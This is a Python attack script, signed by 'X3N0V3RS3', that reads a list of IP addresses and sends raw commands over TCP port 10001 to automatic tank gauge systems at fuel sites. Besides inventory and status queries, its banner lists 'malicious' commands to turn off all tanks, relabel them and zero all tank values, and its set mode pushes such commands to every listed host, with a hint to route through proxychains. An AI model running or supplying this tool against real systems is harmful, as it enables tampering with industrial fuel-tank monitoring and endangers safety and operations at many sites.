import socket,sys,os,time,threading

print('''ATG Client
       Script written by X3N0V3RS3''')
print('''Command Examples 
         I20100 = Get In Tank Inventory
         I10100 = System Status Report
         I10102 = System Configuration Report
           Malicious Command Examples
         s601000 = Turn off all Tanks
         s60200xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx = Change all Labels to x
         s60400000000000000000 = set all tank values to 0
         (This can be used with proxychains for pentesting purposes)''')

#----------------------------------------------

def defaultrecon():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      port = 10001
      s.connect((atglist[i], port))
      messagecode = "I20100"
      payload = ('\x01' + messagecode + '\n').encode('ascii')
      time.sleep(1) 
      s.sendall(payload)
      time.sleep(1)
      x = s.recv(1024)
      print(atglist[i], x.split())
      s.close

def info():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      port = 10001
      s.connect((atglist[i], port))
      payload = ('\x01' + "I" + messagecode + '\n').encode('ascii')
      time.sleep(1) 
      s.sendall(payload)
      time.sleep(1)
      x = s.recv(1024)
      print(atglist[i], x.split())
      s.close


def set():
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      port = 10001
      s.connect((atglist[i], port))
      payload = ('\x01' + "s" + messagecode + '\n').encode('ascii')
      time.sleep(1) 
      s.sendall(payload)
      time.sleep(1)
      x = s.recv(1024)
      print(atglist[i], x.split())
      payload2 = ('\x01' + "I" + messagecode + '\n').encode('ascii')
      time.sleep(1)
      s.sendall(payload2)
      time.sleep(1)
      print(atglist[i], x.split())
      s.close
#---------------------------------------------

#list variable
i = 0

atglist = []

mode = input("select mode :")

if mode != "default": 
   messagecode = str(input("Enter MSG code to send :"))


#Station IP List  
with open("atglist.txt", 'r') as ip:
  for line in ip:
     for addr in line.split():
           atglist.append(addr)
           if mode == "default" or "":
              bot = threading.Thread(target=defaultrecon)
              time.sleep(1)
              bot.start()
              bot.join()
              i+=1
           elif mode == "info":
              bot = threading.Thread(target=info)
              time.sleep(1)
              bot.start()
              bot.join()
              i+=1
           elif mode == "set":
              bot = threading.Thread(target=set)
              time.sleep(1)
              bot.start()
              bot.join()
              i+=1
